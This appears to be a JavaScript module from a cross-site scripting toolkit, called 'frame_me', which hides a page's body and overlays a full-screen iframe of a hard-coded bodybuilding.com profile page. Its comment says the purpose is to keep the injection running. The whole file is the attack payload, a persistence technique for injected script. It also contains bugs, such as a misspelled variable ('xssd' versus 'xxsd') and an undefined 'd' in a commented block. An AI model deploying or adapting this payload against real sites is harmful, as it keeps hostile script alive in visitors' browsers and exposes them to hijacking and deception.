<?
# removes document body and replaces it with and iframe of the same document.
# this keeps the injection runing.
?>
debug("begin frame_me");

/*
// non jquery version
var frame = document.createElement("iframe");
frame.src=window.location.href;
//frame.style="overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;position:absolute;top:0px;left:0px;right:0px;bottom:0px";
//d=document.getElementById("bgCon");
alert(d);
console.log(d);
console.log(frame);
//d=document.body;
//d.innerHTML="";
d.appendChild(frame);
console.log("APPENDED!");
*/

//alert("frame to " +  window.location.href);
// need to add param so we know it's been "framed"
//var fsrc = window.location.href;

debug("cheack frame injection");
if (window.top!=window.self) {
	debug("Frame already injected, done.");
} else {
	debug("Injecting frame...");

$('body').children().hide();
xssd=document.getElementsByTagName("body")[0];
xxsd.class = "";
debug("body hidden");

$('<iframe>')
  .css({
 position: 'absolute',
 width: '100%',
 height: '100%',
 top: 0,
 left: 0,
 border: 0,
 background: '#fff'
 }).attr('src', "http://bodyspace.bodybuilding.com/dallasf/").appendTo('body');

debug("Frame injection complete");
}
